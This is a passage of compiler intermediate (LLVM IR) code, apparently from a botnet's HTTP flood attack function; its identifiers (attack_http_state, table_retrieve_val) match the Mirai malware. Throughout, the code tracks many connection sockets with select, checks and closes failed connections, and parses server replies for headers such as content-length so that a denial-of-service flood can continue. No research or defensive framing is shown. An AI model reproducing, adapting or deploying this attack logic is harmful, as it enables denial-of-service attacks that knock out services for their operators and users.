  %795 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %796 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %795, i32 0, i32 0
  %797 = load i32, i32* %796, align 4
  %798 = sdiv i32 %797, 64
  %799 = sext i32 %798 to i64
  %800 = getelementptr inbounds [16 x i64], [16 x i64]* %794, i64 0, i64 %799
  %801 = load i64, i64* %800, align 8
  %802 = or i64 %801, %793
  store i64 %802, i64* %800, align 8
  %803 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %804 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %803, i32 0, i32 0
  %805 = load i32, i32* %804, align 4
  %806 = load i32, i32* %23, align 4
  %807 = icmp sgt i32 %805, %806
  br i1 %807, label %808, label %813

; <label>:808:                                    ; preds = %774
  %809 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %810 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %809, i32 0, i32 0
  %811 = load i32, i32* %810, align 4
  %812 = add nsw i32 %811, 1
  store i32 %812, i32* %23, align 4
  br label %813

; <label>:813:                                    ; preds = %808, %774
  br label %941

; <label>:814:                                    ; preds = %534
  %815 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %816 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %815, i32 0, i32 1
  %817 = load i8, i8* %816, align 4
  %818 = zext i8 %817 to i32
  %819 = icmp eq i32 %818, 6
  br i1 %819, label %820, label %847

; <label>:820:                                    ; preds = %814
  %821 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %822 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %821, i32 0, i32 0
  %823 = load i32, i32* %822, align 4
  %824 = srem i32 %823, 64
  %825 = zext i32 %824 to i64
  %826 = shl i64 1, %825
  %827 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %828 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %829 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %828, i32 0, i32 0
  %830 = load i32, i32* %829, align 4
  %831 = sdiv i32 %830, 64
  %832 = sext i32 %831 to i64
  %833 = getelementptr inbounds [16 x i64], [16 x i64]* %827, i64 0, i64 %832
  %834 = load i64, i64* %833, align 8
  %835 = or i64 %834, %826
  store i64 %835, i64* %833, align 8
  %836 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %837 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %836, i32 0, i32 0
  %838 = load i32, i32* %837, align 4
  %839 = load i32, i32* %23, align 4
  %840 = icmp sgt i32 %838, %839
  br i1 %840, label %841, label %846

; <label>:841:                                    ; preds = %820
  %842 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %843 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %842, i32 0, i32 0
  %844 = load i32, i32* %843, align 4
  %845 = add nsw i32 %844, 1
  store i32 %845, i32* %23, align 4
  br label %846

; <label>:846:                                    ; preds = %841, %820
  br label %940

; <label>:847:                                    ; preds = %814
  %848 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %849 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %848, i32 0, i32 1
  %850 = load i8, i8* %849, align 4
  %851 = zext i8 %850 to i32
  %852 = icmp eq i32 %851, 7
  br i1 %852, label %853, label %880

; <label>:853:                                    ; preds = %847
  %854 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %855 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %854, i32 0, i32 0
  %856 = load i32, i32* %855, align 4
  %857 = srem i32 %856, 64
  %858 = zext i32 %857 to i64
  %859 = shl i64 1, %858
  %860 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %861 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %862 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %861, i32 0, i32 0
  %863 = load i32, i32* %862, align 4
  %864 = sdiv i32 %863, 64
  %865 = sext i32 %864 to i64
  %866 = getelementptr inbounds [16 x i64], [16 x i64]* %860, i64 0, i64 %865
  %867 = load i64, i64* %866, align 8
  %868 = or i64 %867, %859
  store i64 %868, i64* %866, align 8
  %869 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %870 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %869, i32 0, i32 0
  %871 = load i32, i32* %870, align 4
  %872 = load i32, i32* %23, align 4
  %873 = icmp sgt i32 %871, %872
  br i1 %873, label %874, label %879

; <label>:874:                                    ; preds = %853
  %875 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %876 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %875, i32 0, i32 0
  %877 = load i32, i32* %876, align 4
  %878 = add nsw i32 %877, 1
  store i32 %878, i32* %23, align 4
  br label %879

; <label>:879:                                    ; preds = %874, %853
  br label %939

; <label>:880:                                    ; preds = %847
  %881 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %882 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %881, i32 0, i32 1
  %883 = load i8, i8* %882, align 4
  %884 = zext i8 %883 to i32
  %885 = icmp eq i32 %884, 10
  br i1 %885, label %886, label %913

; <label>:886:                                    ; preds = %880
  %887 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %888 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %887, i32 0, i32 0
  %889 = load i32, i32* %888, align 4
  %890 = srem i32 %889, 64
  %891 = zext i32 %890 to i64
  %892 = shl i64 1, %891
  %893 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %894 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %895 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %894, i32 0, i32 0
  %896 = load i32, i32* %895, align 4
  %897 = sdiv i32 %896, 64
  %898 = sext i32 %897 to i64
  %899 = getelementptr inbounds [16 x i64], [16 x i64]* %893, i64 0, i64 %898
  %900 = load i64, i64* %899, align 8
  %901 = or i64 %900, %892
  store i64 %901, i64* %899, align 8
  %902 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %903 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %902, i32 0, i32 0
  %904 = load i32, i32* %903, align 4
  %905 = load i32, i32* %23, align 4
  %906 = icmp sgt i32 %904, %905
  br i1 %906, label %907, label %912

; <label>:907:                                    ; preds = %886
  %908 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %909 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %908, i32 0, i32 0
  %910 = load i32, i32* %909, align 4
  %911 = add nsw i32 %910, 1
  store i32 %911, i32* %23, align 4
  br label %912

; <label>:912:                                    ; preds = %907, %886
  br label %938

; <label>:913:                                    ; preds = %880
  %914 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %915 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %914, i32 0, i32 1
  %916 = load i8, i8* %915, align 4
  %917 = zext i8 %916 to i32
  %918 = icmp eq i32 %917, 11
  br i1 %918, label %919, label %928

; <label>:919:                                    ; preds = %913
  %920 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %921 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %920, i32 0, i32 1
  store i8 0, i8* %921, align 4
  %922 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %923 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %922, i32 0, i32 0
  %924 = load i32, i32* %923, align 4
  %925 = call i32 @close(i32 %924)
  %926 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %927 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %926, i32 0, i32 0
  store i32 -1, i32* %927, align 4
  br label %937

; <label>:928:                                    ; preds = %913
  %929 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %930 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %929, i32 0, i32 1
  store i8 0, i8* %930, align 4
  %931 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %932 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %931, i32 0, i32 0
  %933 = load i32, i32* %932, align 4
  %934 = call i32 @close(i32 %933)
  %935 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %936 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %935, i32 0, i32 0
  store i32 -1, i32* %936, align 4
  br label %937

; <label>:937:                                    ; preds = %928, %919
  br label %938

; <label>:938:                                    ; preds = %937, %912
  br label %939

; <label>:939:                                    ; preds = %938, %879
  br label %940

; <label>:940:                                    ; preds = %939, %846
  br label %941

; <label>:941:                                    ; preds = %940, %813
  br label %942

; <label>:942:                                    ; preds = %941, %533
  br label %943

; <label>:943:                                    ; preds = %942, %484
  br label %944

; <label>:944:                                    ; preds = %943, %498, %421
  %945 = load i32, i32* %9, align 4
  %946 = add nsw i32 %945, 1
  store i32 %946, i32* %9, align 4
  br label %373

; <label>:947:                                    ; preds = %373
  %948 = load i32, i32* %23, align 4
  %949 = icmp eq i32 %948, 0
  br i1 %949, label %950, label %951

; <label>:950:                                    ; preds = %947
  br label %350

; <label>:951:                                    ; preds = %947
  %952 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %952, align 8
  %953 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %953, align 8
  %954 = load i32, i32* %23, align 4
  %955 = call i32 @select(i32 %954, %struct.fd_set* %21, %struct.fd_set* %22, %struct.fd_set* null, %struct.timeval* %25)
  store i32 %955, i32* %24, align 4
  %956 = call i64 @time(i64* null) #6
  %957 = trunc i64 %956 to i32
  store i32 %957, i32* %27, align 4
  %958 = load i32, i32* %24, align 4
  %959 = icmp slt i32 %958, 1
  br i1 %959, label %960, label %961

; <label>:960:                                    ; preds = %951
  br label %350

; <label>:961:                                    ; preds = %951
  store i32 0, i32* %9, align 4
  br label %962

; <label>:962:                                    ; preds = %2441, %961
  %963 = load i32, i32* %9, align 4
  %964 = load i32, i32* %18, align 4
  %965 = icmp slt i32 %963, %964
  br i1 %965, label %966, label %2444

; <label>:966:                                    ; preds = %962
  %967 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %968 = load i32, i32* %9, align 4
  %969 = sext i32 %968 to i64
  %970 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %967, i64 %969
  store %struct.attack_http_state* %970, %struct.attack_http_state** %26, align 8
  %971 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %972 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %971, i32 0, i32 0
  %973 = load i32, i32* %972, align 4
  %974 = icmp eq i32 %973, -1
  br i1 %974, label %975, label %976

; <label>:975:                                    ; preds = %966
  br label %2441

; <label>:976:                                    ; preds = %966
  %977 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %978 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %979 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %978, i32 0, i32 0
  %980 = load i32, i32* %979, align 4
  %981 = sdiv i32 %980, 64
  %982 = sext i32 %981 to i64
  %983 = getelementptr inbounds [16 x i64], [16 x i64]* %977, i64 0, i64 %982
  %984 = load i64, i64* %983, align 8
  %985 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %986 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %985, i32 0, i32 0
  %987 = load i32, i32* %986, align 4
  %988 = srem i32 %987, 64
  %989 = zext i32 %988 to i64
  %990 = shl i64 1, %989
  %991 = and i64 %984, %990
  %992 = icmp ne i64 %991, 0
  br i1 %992, label %993, label %1017

; <label>:993:                                    ; preds = %976
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %994 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %995 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %994, i32 0, i32 0
  %996 = load i32, i32* %995, align 4
  %997 = bitcast i32* %35 to i8*
  %998 = call i32 @getsockopt(i32 %996, i32 1, i32 4, i8* %997, i32* %36) #6
  store i32 %998, i32* %12, align 4
  %999 = load i32, i32* %35, align 4
  %1000 = icmp eq i32 %999, 0
  br i1 %1000, label %1001, label %1007

; <label>:1001:                                   ; preds = %993
  %1002 = load i32, i32* %12, align 4
  %1003 = icmp eq i32 %1002, 0
  br i1 %1003, label %1004, label %1007

; <label>:1004:                                   ; preds = %1001
  %1005 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1006 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1005, i32 0, i32 1
  store i8 4, i8* %1006, align 4
  br label %1016

; <label>:1007:                                   ; preds = %1001, %993
  %1008 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1009 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1008, i32 0, i32 0
  %1010 = load i32, i32* %1009, align 4
  %1011 = call i32 @close(i32 %1010)
  %1012 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1013 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1012, i32 0, i32 0
  store i32 -1, i32* %1013, align 4
  %1014 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1015 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1014, i32 0, i32 1
  store i8 0, i8* %1015, align 4
  br label %2441

; <label>:1016:                                   ; preds = %1004
  br label %1017

; <label>:1017:                                   ; preds = %1016, %976
  %1018 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1019 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1020 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1019, i32 0, i32 0
  %1021 = load i32, i32* %1020, align 4
  %1022 = sdiv i32 %1021, 64
  %1023 = sext i32 %1022 to i64
  %1024 = getelementptr inbounds [16 x i64], [16 x i64]* %1018, i64 0, i64 %1023
  %1025 = load i64, i64* %1024, align 8
  %1026 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1027 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1026, i32 0, i32 0
  %1028 = load i32, i32* %1027, align 4
  %1029 = srem i32 %1028, 64
  %1030 = zext i32 %1029 to i64
  %1031 = shl i64 1, %1030
  %1032 = and i64 %1025, %1031
  %1033 = icmp ne i64 %1032, 0
  br i1 %1033, label %1034, label %2440

; <label>:1034:                                   ; preds = %1017
  %1035 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1036 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1035, i32 0, i32 1
  %1037 = load i8, i8* %1036, align 4
  %1038 = zext i8 %1037 to i32
  %1039 = icmp eq i32 %1038, 6
  br i1 %1039, label %1040, label %2003

; <label>:1040:                                   ; preds = %1034
  store i32 0, i32* %37, align 4
  %1041 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  call void @util_zero(i8* %1041, i32 10240)
  %1042 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1043 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1042, i32 0, i32 0
  %1044 = load i32, i32* %1043, align 4
  %1045 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1046 = call i64 @recv(i32 %1044, i8* %1045, i64 10240, i32 16386)
  %1047 = trunc i64 %1046 to i32
  store i32 %1047, i32* %12, align 4
  %1048 = icmp slt i32 %1047, 1
  br i1 %1048, label %1049, label %1058

; <label>:1049:                                   ; preds = %1040
  %1050 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1051 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1050, i32 0, i32 0
  %1052 = load i32, i32* %1051, align 4
  %1053 = call i32 @close(i32 %1052)
  %1054 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1055 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1054, i32 0, i32 0
  store i32 -1, i32* %1055, align 4
  %1056 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1057 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1056, i32 0, i32 1
  store i8 0, i8* %1057, align 4
  br label %2441

; <label>:1058:                                   ; preds = %1040
  %1059 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1060 = load i32, i32* %12, align 4
  %1061 = call i32 @util_memsearch(i8* %1059, i32 %1060, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1062 = icmp eq i32 %1061, -1
  br i1 %1062, label %1063, label %1067

; <label>:1063:                                   ; preds = %1058
  %1064 = load i32, i32* %12, align 4
  %1065 = icmp slt i32 %1064, 10240
  br i1 %1065, label %1066, label %1067

; <label>:1066:                                   ; preds = %1063
  br label %2441

; <label>:1067:                                   ; preds = %1063, %1058
  %1068 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1069 = load i32, i32* %12, align 4
  %1070 = call i32 @util_memsearch(i8* %1068, i32 %1069, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1071 = sext i32 %1070 to i64
  %1072 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1071
  store i8 0, i8* %1072, align 1
  %1073 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1074 = load i32, i32* %12, align 4
  %1075 = call i8* @table_retrieve_val(i32 62, i32* null)
  %1076 = call i32 @util_stristr(i8* %1073, i32 %1074, i8* %1075)
  %1077 = icmp ne i32 %1076, -1
  br i1 %1077, label %1078, label %1081

; <label>:1078:                                   ; preds = %1067
  %1079 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1080 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1079, i32 0, i32 11
  store i32 2, i32* %1080, align 4
  br label %1081

; <label>:1081:                                   ; preds = %1078, %1067
  %1082 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1083 = load i32, i32* %12, align 4
  %1084 = call i8* @table_retrieve_val(i32 61, i32* null)
  %1085 = call i32 @util_stristr(i8* %1082, i32 %1083, i8* %1084)
  %1086 = icmp ne i32 %1085, -1
  br i1 %1086, label %1087, label %1090

; <label>:1087:                                   ; preds = %1081
  %1088 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1089 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1088, i32 0, i32 11
  store i32 1, i32* %1089, align 4
  br label %1090

; <label>:1090:                                   ; preds = %1087, %1081
  %1091 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1092 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1091, i32 0, i32 12
  store i32 0, i32* %1092, align 4
  %1093 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1094 = load i32, i32* %12, align 4
  %1095 = call i8* @table_retrieve_val(i32 60, i32* null)
  %1096 = call i32 @util_stristr(i8* %1093, i32 %1094, i8* %1095)
  %1097 = icmp ne i32 %1096, -1
  br i1 %1097, label %1098, label %1149

; <label>:1098:                                   ; preds = %1090
  %1099 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1100 = load i32, i32* %12, align 4
  %1101 = call i8* @table_retrieve_val(i32 60, i32* null)
  %1102 = call i32 @util_stristr(i8* %1099, i32 %1100, i8* %1101)
  store i32 %1102, i32* %38, align 4
  %1103 = load i32, i32* %38, align 4
  %1104 = sext i32 %1103 to i64
  %1105 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1104
  %1106 = load i8, i8* %1105, align 1
  %1107 = sext i8 %1106 to i32
  %1108 = icmp eq i32 %1107, 32
  br i1 %1108, label %1109, label %1112

; <label>:1109:                                   ; preds = %1098
  %1110 = load i32, i32* %38, align 4
  %1111 = add nsw i32 %1110, 1
  store i32 %1111, i32* %38, align 4
  br label %1112

; <label>:1112:                                   ; preds = %1109, %1098
  %1113 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1114 = load i32, i32* %38, align 4
  %1115 = sext i32 %1114 to i64
  %1116 = getelementptr inbounds i8, i8* %1113, i64 %1115
  %1117 = load i32, i32* %12, align 4
  %1118 = load i32, i32* %38, align 4
  %1119 = sub nsw i32 %1117, %1118
  %1120 = call i32 @util_memsearch(i8* %1116, i32 %1119, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1120, i32* %39, align 4
  %1121 = load i32, i32* %39, align 4
  %1122 = icmp ne i32 %1121, -1
  br i1 %1122, label %1123, label %1148

; <label>:1123:                                   ; preds = %1112
  %1124 = load i32, i32* %38, align 4
  %1125 = sext i32 %1124 to i64
  %1126 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1125
  store i8* %1126, i8** %40, align 8
  %1127 = load i32, i32* %39, align 4
  %1128 = icmp sge i32 %1127, 2
  br i1 %1128, label %1129, label %1132

; <label>:1129:                                   ; preds = %1123
  %1130 = load i32, i32* %39, align 4
  %1131 = sub nsw i32 %1130, 2
  store i32 %1131, i32* %39, align 4
  br label %1132

; <label>:1132:                                   ; preds = %1129, %1123
  %1133 = load i32, i32* %38, align 4
  %1134 = load i32, i32* %39, align 4
  %1135 = add nsw i32 %1133, %1134
  %1136 = sext i32 %1135 to i64
  %1137 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1136
  store i8 0, i8* %1137, align 1
  %1138 = load i8*, i8** %40, align 8
  %1139 = load i8*, i8** %40, align 8
  %1140 = call i32 @util_strlen(i8* %1139)
  %1141 = call i8* @table_retrieve_val(i32 59, i32* null)
  %1142 = call i32 @util_stristr(i8* %1138, i32 %1140, i8* %1141)
  %1143 = icmp ne i32 %1142, 0
  br i1 %1143, label %1144, label %1147

; <label>:1144:                                   ; preds = %1132
  %1145 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1146 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1145, i32 0, i32 12
  store i32 1, i32* %1146, align 4
  br label %1147

; <label>:1147:                                   ; preds = %1144, %1132
  br label %1148

; <label>:1148:                                   ; preds = %1147, %1112
  br label %1149

; <label>:1149:                                   ; preds = %1148, %1090
  %1150 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1151 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1150, i32 0, i32 13
  store i32 0, i32* %1151, align 4
  %1152 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1153 = load i32, i32* %12, align 4
  %1154 = call i8* @table_retrieve_val(i32 57, i32* null)
  %1155 = call i32 @util_stristr(i8* %1152, i32 %1153, i8* %1154)
  %1156 = icmp ne i32 %1155, -1
  br i1 %1156, label %1157, label %1208

; <label>:1157:                                   ; preds = %1149
  %1158 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1159 = load i32, i32* %12, align 4
  %1160 = call i8* @table_retrieve_val(i32 57, i32* null)
  %1161 = call i32 @util_stristr(i8* %1158, i32 %1159, i8* %1160)
  store i32 %1161, i32* %41, align 4
  %1162 = load i32, i32* %41, align 4
  %1163 = sext i32 %1162 to i64
  %1164 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1163
  %1165 = load i8, i8* %1164, align 1
  %1166 = sext i8 %1165 to i32
  %1167 = icmp eq i32 %1166, 32
  br i1 %1167, label %1168, label %1171

; <label>:1168:                                   ; preds = %1157
  %1169 = load i32, i32* %41, align 4
  %1170 = add nsw i32 %1169, 1
  store i32 %1170, i32* %41, align 4
  br label %1171

; <label>:1171:                                   ; preds = %1168, %1157
  %1172 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1173 = load i32, i32* %41, align 4
  %1174 = sext i32 %1173 to i64
  %1175 = getelementptr inbounds i8, i8* %1172, i64 %1174
  %1176 = load i32, i32* %12, align 4
  %1177 = load i32, i32* %41, align 4
  %1178 = sub nsw i32 %1176, %1177
  %1179 = call i32 @util_memsearch(i8* %1175, i32 %1178, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1179, i32* %42, align 4
  %1180 = load i32, i32* %42, align 4
  %1181 = icmp ne i32 %1180, -1
  br i1 %1181, label %1182, label %1207

; <label>:1182:                                   ; preds = %1171
  %1183 = load i32, i32* %41, align 4
  %1184 = sext i32 %1183 to i64
  %1185 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1184
  store i8* %1185, i8** %43, align 8
  %1186 = load i32, i32* %42, align 4
  %1187 = icmp sge i32 %1186, 2
  br i1 %1187, label %1188, label %1191

; <label>:1188:                                   ; preds = %1182
  %1189 = load i32, i32* %42, align 4
  %1190 = sub nsw i32 %1189, 2
  store i32 %1190, i32* %42, align 4
  br label %1191

; <label>:1191:                                   ; preds = %1188, %1182
  %1192 = load i32, i32* %41, align 4
  %1193 = load i32, i32* %42, align 4
  %1194 = add nsw i32 %1192, %1193
  %1195 = sext i32 %1194 to i64
  %1196 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1195
  store i8 0, i8* %1196, align 1
  %1197 = load i8*, i8** %43, align 8
  %1198 = load i8*, i8** %43, align 8
  %1199 = call i32 @util_strlen(i8* %1198)
  %1200 = call i8* @table_retrieve_val(i32 58, i32* null)
  %1201 = call i32 @util_stristr(i8* %1197, i32 %1199, i8* %1200)
  %1202 = icmp ne i32 %1201, 0
  br i1 %1202, label %1203, label %1206

; <label>:1203:                                   ; preds = %1191
  %1204 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1205 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1204, i32 0, i32 13
  store i32 1, i32* %1205, align 4
  br label %1206

; <label>:1206:                                   ; preds = %1203, %1191
  br label %1207

; <label>:1207:                                   ; preds = %1206, %1171
  br label %1208

; <label>:1208:                                   ; preds = %1207, %1149
  %1209 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1210 = load i32, i32* %12, align 4
  %1211 = call i8* @table_retrieve_val(i32 56, i32* null)
  %1212 = call i32 @util_stristr(i8* %1209, i32 %1210, i8* %1211)
  %1213 = icmp ne i32 %1212, -1
  br i1 %1213, label %1214, label %1259

; <label>:1214:                                   ; preds = %1208
  %1215 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1216 = load i32, i32* %12, align 4
  %1217 = call i8* @table_retrieve_val(i32 56, i32* null)
  %1218 = call i32 @util_stristr(i8* %1215, i32 %1216, i8* %1217)
  store i32 %1218, i32* %44, align 4
  %1219 = load i32, i32* %44, align 4
  %1220 = sext i32 %1219 to i64
  %1221 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1220
  %1222 = load i8, i8* %1221, align 1
  %1223 = sext i8 %1222 to i32
  %1224 = icmp eq i32 %1223, 32
  br i1 %1224, label %1225, label %1228

; <label>:1225:                                   ; preds = %1214
  %1226 = load i32, i32* %44, align 4
  %1227 = add nsw i32 %1226, 1
  store i32 %1227, i32* %44, align 4
  br label %1228

; <label>:1228:                                   ; preds = %1225, %1214
  %1229 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1230 = load i32, i32* %44, align 4
  %1231 = sext i32 %1230 to i64
  %1232 = getelementptr inbounds i8, i8* %1229, i64 %1231
  %1233 = load i32, i32* %12, align 4
  %1234 = load i32, i32* %44, align 4
  %1235 = sub nsw i32 %1233, %1234
  %1236 = call i32 @util_memsearch(i8* %1232, i32 %1235, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1236, i32* %45, align 4
  %1237 = load i32, i32* %45, align 4
  %1238 = icmp ne i32 %1237, -1
  br i1 %1238, label %1239, label %1258

; <label>:1239:                                   ; preds = %1228
  %1240 = load i32, i32* %44, align 4
  %1241 = sext i32 %1240 to i64
  %1242 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1241
  store i8* %1242, i8** %46, align 8
  %1243 = load i32, i32* %45, align 4
  %1244 = icmp sge i32 %1243, 2
  br i1 %1244, label %1245, label %1248

; <label>:1245:                                   ; preds = %1239
  %1246 = load i32, i32* %45, align 4
  %1247 = sub nsw i32 %1246, 2
  store i32 %1247, i32* %45, align 4
  br label %1248

; <label>:1248:                                   ; preds = %1245, %1239
  %1249 = load i32, i32* %44, align 4
  %1250 = load i32, i32* %45, align 4
  %1251 = add nsw i32 %1249, %1250
  %1252 = sext i32 %1251 to i64
  %1253 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1252
  store i8 0, i8* %1253, align 1
  %1254 = load i8*, i8** %46, align 8
  %1255 = call i32 @util_atoi(i8* %1254, i32 10)
  %1256 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
